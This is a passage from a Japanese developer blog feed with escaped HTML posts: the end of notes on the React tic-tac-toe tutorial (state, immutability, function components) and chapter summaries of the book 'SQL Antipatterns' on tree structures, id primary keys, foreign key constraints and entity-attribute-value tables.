簡単な機能からつくって、段々と一つの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>に機能を盛り込んでほかは表示するだけの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>にしていく構成になっています。&lt;/p>
&lt;p>いくつかなるほどなぁと思ったことを書きます。&lt;/p>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>のstateはその&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>だけの物&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB">チュートリアル&lt;/a>では&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A1%FB%A1%DF%A5%B2%A1%BC%A5%E0">○×ゲーム&lt;/a>を作るために、マス、ボード、ゲームそのものという感じで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>を作っていくんですが、&lt;br>
最終的に作るマスもボードもゲーム&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>からプロパティを受け取って表示してるだけの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>なります。&lt;/p>
&lt;pre class="code lang-javascript" data-lang="javascript" data-unlink> function Square(props) {
return (
&amp;lt;button className="square" onClick={props.onClick}&amp;gt; #渡されたプロパティを参照してる
{props.value}
&amp;lt;/button&amp;gt;
);
}
&lt;/pre>
&lt;pre class="code lang-javascript" data-lang="javascript" data-unlink> class Board extends React.Component {
renderSquare(i) {
return (
&amp;lt;Square
value={this.props.squares[i]}
onClick={() =&amp;gt; this.props.onClick(i)}　#渡されたプロパティを参照してる、Boardコンポーネントはマスの番号だけ渡している
/&amp;gt;
);
}
render() {
return (
&amp;lt;div&amp;gt;
&amp;lt;div className="board-row"&amp;gt;
{this.renderSquare(0)}
.............
&lt;/pre>
&lt;pre class="code lang-javascript" data-lang="javascript" data-unlink> class Game extends React.Component {
constructor(props) {
super(props);
this.state = {
history: [
{
squares: Array(9).fill(null)
}
],
stepNumber: 0,
xIsNext: true
};
}
　　　　　(中略）
return (
&amp;lt;div className="game"&amp;gt;
&amp;lt;div className="game-board"&amp;gt;
&amp;lt;Board squares={current.squares} onClick={i =&amp;gt; this.handleClick(i)} /&amp;gt;　#ここでコンポーネントクラスの中での関数とかをプロパティとして渡している。
&amp;lt;/div&amp;gt;
&lt;/pre>
&lt;p>ここで重要なのはGame&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>はstateを持っていてsetStateしてstateに情報を追加したりしていくんですが、Board&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>もSquare&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>でもstateの変化は考えません。&lt;br>
Game&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>のstateはGame&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>の中でのみ扱ってプロパティとして子&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>にわたす必要があります。 子&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>が子&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>同士や親&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>と連携が取れなくなってしまうからです。&lt;/p>
&lt;h3>stateは不変性が大事&lt;/h3>
&lt;p>この&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A1%FB%A1%DF%A5%B2%A1%BC%A5%E0">○×ゲーム&lt;/a>ではターンの履歴を前回のボードの状態を一度コピーしてからそのコピーに変わった状況を書き込んで、stateに加工したコピーを追加しています。state直接変えないです。途中の履歴とかを意識しない段階でもstateを一度コピーしてから加工したコピーをsetStateしています。&lt;br>
これは何故かと言うとReactの利点である、変更されたもののみ描画し直すという機能のために、変更されたものと変更前がわかる必要があるからです。直接変更してしまうと、前と後がないためstateの変化が検出できません。stateそのものは不変であるべき、というのがおすすめされています。&lt;code>pure components&lt;/code>つくっていきたいザウルスですね。&lt;/p>
&lt;h3>function&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>
&lt;/h3>
&lt;p>その&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>がstateを扱わないときはReact.Component継承しないでfunctionで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>つくるのもよい、と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB">チュートリアル&lt;/a>にあります。&lt;br>
逆にfunction componentsみたらそれはstateは扱っていないんだな、と考えるとコードが読みやすくなるかも、と感じました。&lt;/p>
&lt;h3>Reactというよりは、、、&lt;/h3>
&lt;p>職場でもきいた話なんですけど、Reactが難しいというより、どういう形で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>の組織が作られていて、どこでstateをどのように管理しているか把握するのが難しいのかなと感じました。適当にやると&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>同士の連携がめちゃんこになって「React わからない 人生」とかで検索することになりそう。&lt;/p>
&lt;/body></description></item><item><title>SQLアンチパターン　第５章を読んで</title><link>https://qwyng.dev/posts/2019/02/20/221013/</link><pubDate>Wed, 20 Feb 2019 22:10:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/20/221013/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.oreilly.co.jp%2Fbooks%2F9784873115894%2F" title="SQLアンチパターン" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://www.oreilly.co.jp/books/9784873115894/">www.oreilly.co.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>を読んでの要約、感想です。&lt;/p>
&lt;h3>目的&lt;/h3>
&lt;p>同じ属性を持ちつつも、例えばSmartphoneというオブジェクトがあるとして方や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a>_version、方や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a>_versionを持っている場合に対応したいというのが今回の目的です。&lt;/p>
&lt;h3>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>&lt;/h3>
&lt;p>別テーブルをつくり属性を行に格納してしまうというものです&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> smartphone_id &lt;/th>
&lt;th> os_version &lt;/th>
&lt;th> os_version_&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/value">value&lt;/a>(VARCHAR) &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a>_version &lt;/td>
&lt;td> oreo &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a>_version &lt;/td>
&lt;td> 12 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 3 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/blackberry">blackberry&lt;/a>_version &lt;/td>
&lt;td> 7.1 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>いちいちSmartphonesテーブルに列を増やさなてくてもいいですし、急なOSの登場にも耐えられます。&lt;/p>
&lt;h3>デメリット&lt;/h3>
&lt;ol>
&lt;li>対象の行を指定してから取り出すして使う必要がある。（これは織り込み済みのデメリットの気もしますが）&lt;/li>
&lt;li>行に属性がはいるのでデータ型なんかは整合性はとれず文字列をいれるしかありません。もしくはデータ型に対応するカラムをたくさん用意するかです。&lt;/li>
&lt;li>行として属性をもっているので内部結合しようと持っていない属性を指定してしまうと結合できず、何も取り出せないので外部結合するしかありません。必然的に扱う行の数は多くなります。&lt;/li>
&lt;/ol>
&lt;h3>使用してもいい場&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>以外の非リレーショナルな技術をつかう時とあります。確かに。&lt;/p>
&lt;h3>解決策&lt;/h3>
&lt;ul>
&lt;li>シングルテーブル継承&lt;/li>
&lt;/ul>
&lt;p>サブタイプの数が限られていれば&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> smartphone_id &lt;/th>
&lt;th> name &lt;/th>
&lt;th> os &lt;/th>
&lt;th> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a>_version &lt;/th>
&lt;th> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a>_version &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/iphone6">iphone6&lt;/a> &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a> &lt;/td>
&lt;td> oreo &lt;/td>
&lt;td> null &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> honor9 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a> &lt;/td>
&lt;td> null &lt;/td>
&lt;td> 12 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ActiveRecord">ActiveRecord&lt;/a>を使うような単純な設計の時◯です。&lt;/p>
&lt;ul>
&lt;li>具象テーブル継承&lt;/li>
&lt;/ul>
&lt;p>変化する属性ごとにテーブルをつくります。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> smartphone_id &lt;/th>
&lt;th> name &lt;/th>
&lt;th> os &lt;/th>
&lt;th> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a>_version &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/iphone6">iphone6&lt;/a> &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a> &lt;/td>
&lt;td> 12 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> smartphone_id &lt;/th>
&lt;th> name &lt;/th>
&lt;th> os &lt;/th>
&lt;th> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a>_version &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> honor9 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a> &lt;/td>
&lt;td> oreo &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>nullがなくなります&lt;/p>
&lt;ul>
&lt;li>クラステーブル継承&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> smartphone_id &lt;/th>
&lt;th> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a>_version &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> 12 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> smartphone_id &lt;/th>
&lt;th> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a>_version &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> oreo &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>共通要素を元テーブルで持ち、違う要素をそれぞれ別のテーブルに切り出すというものです。その名の通りクラス継承と同じ形です。&lt;/p>
&lt;ul>
&lt;li>半構造化データ&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> smartphone_id &lt;/th>
&lt;th> name &lt;/th>
&lt;th> os &lt;/th>
&lt;th> version_attributes &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/iphone6">iphone6&lt;/a> &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a> &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a>_version: oreo &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> honor9 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/android">android&lt;/a> &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ios">ios&lt;/a>_version: 12 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>LOB列を作りそこに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JSON">JSON&lt;/a>等の形式で格納してしまおうというものです。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>でアクセスできなくなるので流石に無理がある気がします。&lt;/p>
&lt;h3>感想&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%C7%A1%BC%A5%BF">メタデータ&lt;/a>を格納させると大変だよという章だと思いました。現実的にはシングルテーブル継承が一番使いやすいかなと思います。&lt;/p>
&lt;/body></description></item><item><title>SQLアンチパターン　第四章を読んで</title><link>https://qwyng.dev/posts/2019/02/18/231855/</link><pubDate>Mon, 18 Feb 2019 23:18:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/18/231855/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.oreilly.co.jp%2Fbooks%2F9784873115894%2F" title="SQLアンチパターン" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://www.oreilly.co.jp/books/9784873115894/">www.oreilly.co.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>を読んでの要約、感想です。&lt;/p>
&lt;h3>目的&lt;/h3>
&lt;p>データベースの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>を単純にしたい
データベースの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>、複数のテーブルが複雑にからみあう中で、その関係をもっと柔軟にしたいとういのが今回の目的です。&lt;/p>
&lt;h3>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>&lt;/h3>
&lt;p>外部キー制約をしない&lt;/p>
&lt;h3>デメリット&lt;/h3>
&lt;ol>
&lt;li>関係してるテーブルを確認してから削除や追加をして、という作業をしている間に新たな行が作られたりしてぼっちの情報ができるのを防ぐことができない&lt;/li>
&lt;li>外部キー制約がない場合全ての参照を調べなければならない&lt;/li>
&lt;/ol>
&lt;h3>使用してもいい場合&lt;/h3>
&lt;p>外部キー制約が用いれない場合は仕方ないと本書にはあります。&lt;/p>
&lt;h3>解決策&lt;/h3>
&lt;p>外部キー制約を使用する。&lt;br>
ミス防止は投資以上の効果を発揮する事例が紹介されていました。外部キーを使用するのはミスを防ぐのでとても有用であるとのことです。 &lt;br>
例えば&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>でもvalidationを定義するのはエラーメッセージ等レールにのれるというメリットもありますが、それ以上にミスを防げるというのがメリットだというのと同じだと思います。&lt;br>
制約を作ることは柔軟性を下げるかもしれませんがそれ以上にバグを減らすメリットがあるということですね。&lt;br>
カスケード更新もできるから柔軟性もあるとあります。確かに&lt;a href="https://apidock.com/rails/ActiveRecord/ConnectionAdapters/SchemaStatements/add_foreign_key">カスケード更新&lt;/a>はよく書かれていますね。
関係ないですが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a>の&lt;code>dependent: :destroy&lt;/code>だけだと単に探して消してくれているだけです。&lt;/p>
&lt;pre class="code lang-sql" data-lang="sql" data-unlink> Guide Load (0.3ms) SELECT "guides".* FROM "guides" WHERE "guides"."champion_id" = $1 [["champion_id", 5]]
Guide Destroy (0.3ms) DELETE FROM "guides" WHERE "guides"."id" = $1 [["id", 3]]
Champion Destroy (0.3ms) DELETE FROM "champions" WHERE "champions"."id" = $1 [["id", 5]]
(0.1ms) RELEASE SAVEPOINT active_record_1
&lt;/pre>
&lt;h3>感想&lt;/h3>
&lt;p>外部キー制約を使いなさいという章でした。手軽にできてバグを大幅に減らしてくれるなんてなんて素敵な制約なんだ…&lt;/p>
&lt;/body></description></item><item><title>SQLアンチパターン　第三章を読んで</title><link>https://qwyng.dev/posts/2019/02/17/155504/</link><pubDate>Sun, 17 Feb 2019 15:55:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/17/155504/</guid><description>&lt;body>
&lt;h3>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>&lt;/h3>
&lt;p>行の存在の重複をさけるため、主キーを定めることが多くあります。idというカラムを作って主キーの役割をもたせることも多いです。&lt;br>
今回の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>は全てのテーブルはidというカラムを持たせる、というものです。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>なんかでもデフォルトではidつけますね。&lt;br>
idカラムの特徴は&lt;/p>
&lt;ul>
&lt;li>数字が入ります（正確に言うと32bit or 64bitの整数）&lt;/li>
&lt;li>同じ数字が入ることはありません&lt;/li>
&lt;/ul>
&lt;p>当たり前だと思っていたidも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>になることがあります。&lt;/p>
&lt;h3>デメリット&lt;/h3>
&lt;ul>
&lt;li>冗長なキーができてしまう&lt;/li>
&lt;/ul>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DD%A5%B1%A5%E2%A5%F3">ポケモン&lt;/a>でテーブルを作成すると&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> id &lt;/th>
&lt;th> pokemon_name &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%B7%A5%AE%A5%C0%A5%CD">フシギダネ&lt;/a> &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BC%A5%CB%A5%AC%A5%E1">ゼニガメ&lt;/a> &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 3 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D2%A5%C8%A5%AB%A5%B2">ヒトカゲ&lt;/a> &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>この場合nameは必ず一意になりますしUNIQUE制約もつけられるのでidカラムは必要なキーとは言えなくなります。&lt;br>
また他のテーブルの主キーの組み合わせのを保存する交差テーブルを作っる時にその組み合わせにidをふっても組み合わせの一意にはならないので、組み合わせ2つのカラムにUNIQUEをつける必要がありますがそうなるとidカラムの意味は…ということになります。&lt;/p>
&lt;ul>
&lt;li>idという名前はかならずしもわかりやすくない
idよりpokemon_nameのほうがわかりやすいです。&lt;/li>
&lt;li>USINGが使用できない
カラムにpokemon_nameを持ってる例えばTrainersテーブルではUSING(pokemon_name)と使えますが全てのテーブルの主キーがidだとTrainersもidがあるのでusingにidが使えません。&lt;/li>
&lt;/ul>
&lt;h3>使用してもいい場合&lt;/h3>
&lt;p>ORM&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>（&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby%20on%20Rails">Ruby on Rails&lt;/a>等）では設定より規約ということで、idという整数の疑似キーのカラムがある前提で便利な機能がついています。レールから外れるとその分大変です。ですが疑似キーをid以外の名前(pokemon_idとか）にすることもできることは覚えておいたほうが良さそうです。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>も主キーを変更することは公式でサポートされています。&lt;/p>
&lt;p>&lt;a href="https://railsguides.jp/active_record_migrations.html">https://railsguides.jp/active_record_migrations.html&lt;/a>&lt;/p>
&lt;h3>解決策&lt;/h3>
&lt;p>状況に応じて適切に調整しようとあります。そりゃそうだという気持ちになったのは私だけでしょうか。&lt;/p>
&lt;ul>
&lt;li>主キーをわかりやすい名前にする&lt;/li>
&lt;/ul>
&lt;p>idをproduct_idにするとかですね&lt;/p>
&lt;ul>
&lt;li>自然キー、複合キーの活用&lt;/li>
&lt;/ul>
&lt;p>例のpokemon_nameのように自然に主キーとして使えるものもあるでしょう。こういった自然キーがない、もしくは将来的に信用できない時に擬似キーを使うべきです。
複合キーもカラムの組み合わせが行を識別する時に最適というときには使うといいでしょう。&lt;/p>
&lt;h3>感想&lt;/h3>
&lt;p>規約は必要不可欠というわけではない、柔軟に対応しようねといった章だと思いました。
idというカラムを主キーにすることが悪というよりはそれ以外の主キーの設定もあると知らないのが悪という感じですね。そもそも主キーが連番である必要もデータ型である必要もないというのをデータベース実践技術入門で読んだことがあります。&lt;/p>
&lt;/body></description></item><item><title>SQLアンチパターン 2章</title><link>https://qwyng.dev/posts/2019/02/16/161954/</link><pubDate>Sat, 16 Feb 2019 16:19:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/16/161954/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>
この章ではツリー指向のデータ構造を格納する際の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>になります。&lt;br>
ツリー指向のデータ構造では、ノードは一つ以上の子ノード及び一つの親ノードを持ち一番上がルート、一番下がリーフとなります。文章だと難しいので視覚で、&lt;/p>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>
&lt;ul>
&lt;li>一章
&lt;ul>
&lt;li>一節&lt;/li>
&lt;li>二節&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>二章
&lt;ul>
&lt;li>一節
&lt;ul>
&lt;li>一項&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>二節&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>このような構造です。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8">ディレクト&lt;/a>リなんかと同じ構造ですね。
この構造を格納するためにparent_idカラムをつくり格納すると以下のようになります。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> parts_id &lt;/th>
&lt;th> parts_name &lt;/th>
&lt;th> parent_id &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a> &lt;/td>
&lt;td> &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> 一章 &lt;/td>
&lt;td> 1 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 3 &lt;/td>
&lt;td> 二章 &lt;/td>
&lt;td> 1 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 4 &lt;/td>
&lt;td> 一節 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 5 &lt;/td>
&lt;td> 二節 &lt;/td>
&lt;td> 2 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 6 &lt;/td>
&lt;td> 一節 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 7 &lt;/td>
&lt;td> 二節 &lt;/td>
&lt;td> 3 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 8 &lt;/td>
&lt;td> 一項 &lt;/td>
&lt;td> 6 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>この構造は隣接リストと呼ばれています。これが今回の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>です。&lt;/p>
&lt;p>デメリット&lt;/p>
&lt;ol>
&lt;li>全ての子ノードを取得したい時に（例えば東京から下のノードをすべて取りたい時）に一つ下の子ノードしか辿れないので、一つ一つジョインしていくしかありません。これでは階層が深くなった時に対応できません。&lt;/li>
&lt;li>ノードの追加や移動は簡単ですが、削除するには削除したいノードの子ノードも全て探して削除しなければなりません。またノード単体を移動したいときも、子ノードは一つ上の親に依存しているので親ノードが移動すると子ノードとその下のノードは全てツリーが移動してしまいます。&lt;/li>
&lt;/ol>
&lt;h3>使用してもいい場合&lt;/h3>
